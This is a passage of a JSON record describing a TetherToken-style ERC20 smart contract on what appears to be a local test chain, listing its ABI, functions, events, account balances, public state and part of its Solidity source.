_totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * 